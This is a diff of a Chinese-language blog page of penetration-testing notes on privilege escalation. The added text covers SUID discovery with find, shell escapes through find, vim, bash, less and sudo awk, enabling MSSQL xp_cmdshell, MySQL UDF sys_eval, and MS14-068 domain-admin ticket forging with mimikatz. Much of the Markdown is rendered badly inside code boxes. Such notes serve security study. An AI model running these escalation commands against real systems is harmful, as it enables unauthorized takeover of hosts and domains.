@@ -77,7 +77,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">1.1k</span>
+            <span class="post-count">1.4k</span>
         </span>
     </span>
 
@@ -86,7 +86,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">4 min</span>
+            <span class="post-count">6 min</span>
         </span>
     </span>
 </div>
@@ -102,8 +102,6 @@
     <div class="article-entry" itemprop="articleBody">
        
   <p>[toc]</p>
-<span id="more"></span>
-
 <h1 id="windows-提权"><a href="#windows-提权" class="headerlink" title="windows 提权"></a>windows 提权</h1><hr>
 <h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>汇总：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p>
 <h5 id="提权辅助"><a href="#提权辅助" class="headerlink" title="提权辅助"></a>提权辅助</h5><p>systeminfo   查看补丁</p>
@@ -112,6 +110,8 @@
 <p><img src="/2022/01/16/%E6%8F%90%E6%9D%83/image-20220221104049104.png" alt="image-20220221104049104"></p>
 <p><a target="_blank" rel="noopener" href="https://i.hacking8.com/tiquan">https://i.hacking8.com/tiquan</a> 寻找提权漏洞，github下载，但提权exe需要经过免杀测试 </p>
 <p><a target="_blank" rel="noopener" href="https://github.com/Ascotbe/Kernelhub">Windows提权漏洞合集</a></p>
+<span id="more"></span>
+
 <h5 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h5><ol>
 <li>该模块能够查询安装补丁</li>
 </ol>
@@ -151,7 +151,26 @@
 <ol start="2">
 <li>RPC 135端口是否开启</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;66y_Pg2j9CNfxeErFczdSg</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;lmfM6VWM3YXj2vjalNerKw</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;blog.cfyqy.com&#x2F;article&#x2F;bde10ad7.html#more</span><br><span class="line"></span><br><span class="line"># linux 提权</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 漏洞</span><br><span class="line"></span><br><span class="line">脏牛</span><br><span class="line"></span><br><span class="line">Linux Polkit 权限提升(CVE-2021-4034)</span><br><span class="line"></span><br><span class="line">### suid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### sudo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 计划任务</span><br><span class="line"></span><br><span class="line"># mysql提权</span><br><span class="line"></span><br><span class="line">### udf </span><br><span class="line"></span><br><span class="line">原理：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考：</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;66y_Pg2j9CNfxeErFczdSg</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;lmfM6VWM3YXj2vjalNerKw</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;blog.cfyqy.com&#x2F;article&#x2F;bde10ad7.html#more</span><br><span class="line"></span><br><span class="line"># linux 提权</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>uname -a               查询内核版本<br>cat /etc/issue         查询发行版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 漏洞</span><br><span class="line"></span><br><span class="line">脏牛</span><br><span class="line"></span><br><span class="line">Linux Polkit 权限提升(CVE-2021-4034)</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecWiki&#x2F;linux-kernel-exploits</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>searchsploit Ubuntu 16.04.1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![image-20220307133812910](提权&#x2F;image-20220307133812910.png)</span><br><span class="line"></span><br><span class="line">### SUID</span><br><span class="line"></span><br><span class="line">寻找root用户拥有的suid的文件。普通用户通过suid能够以文件拥有者身份允许该文件</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试<br>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000-print2&gt;/dev/null<br>find / -user root -perm -4000-exec ls -ldb {} ;<br>参考谢公子  <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84872644">https://blog.csdn.net/qq_36119192/article/details/84872644</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">可以利用提权的文件列表</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br>cp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">如果执行命令发现以上程序文件列表，即可提权，例如：发现 &#x2F;usr&#x2F;bin&#x2F;find</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>touch aaa<br>/usr/bin/find  aaa   -exec whoami ;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">vim</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>vim.tiny</p>
+<p>:set shell=/bin/sh<br>:shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>bash -p</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">less</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>less /etc/passwd<br>!/bin/sh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">awk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>sudo awk ‘BEGIN {system(“/bin/bash”)}’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### sudo</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 计划任务</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">参考：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;sfsec&#x2F;p&#x2F;15163907.html</span><br><span class="line"></span><br><span class="line"># mysql提权</span><br><span class="line"></span><br><span class="line">### udf </span><br><span class="line"></span><br><span class="line">原理：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>UDF是mysql的一个扩展接口，即扩展mysql的用户自定义函数。用户可以向mysql的udf.dll中添加用户自定义函数（可以执行命令的函数，如sys_eval（）），即可获得system权限。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">条件：</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <ol>
@@ -181,25 +200,19 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;64.png)</span><br><span class="line"></span><br><span class="line">执行系统命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p>select sys_eval(‘whoami’);</p>
 <p>select sys_eval(‘ipconfig’);</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![](提权&#x2F;65.png)</span><br><span class="line"></span><br><span class="line">成功获取system权限</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### mof</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># mssql提权</span><br><span class="line"></span><br><span class="line">### xp_cmdshell</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>sp_configure ‘show advanced options’,1<br>reconfigure<br>go<br>sp_configure ‘xp_cmdshell’,1<br>reconfigure<br>go</p>
+<p>EXEC xp_cmdshell ‘whoami’;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 域内提权</span><br><span class="line"></span><br><span class="line">### MS14-068</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>前提条件：</p>
+<p>域控没有打该漏洞补丁(KB3011780)</p>
+<p>已经获取普通域用户的账户，密码，hash，sid（whoami /user）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>利用：</p>
+<p>1.mimikatz清除票据<br>kerberos::purge</p>
+<p>2.ms14-068.exe生成票据<br>MS14-068.exe -u <userName>@<domainName> -p <clearPassword> -s <userSid> -d &lt;domainControlerAddr(ip)&gt;</userSid></clearPassword></domainName></userName></p>
+<p>3.mumukatz导入票据，权限提升为域管<br>kerberos::ptc “票据文件名”</p>
 <pre><code>
-![](提权/65.png)
-
-成功获取system权限
-
-
-### mof
-
-
-
-
-
-
-
-
-
-# mssql提权
-
-### xp_cmdshell
 </code></pre>
  
       <!-- reward -->
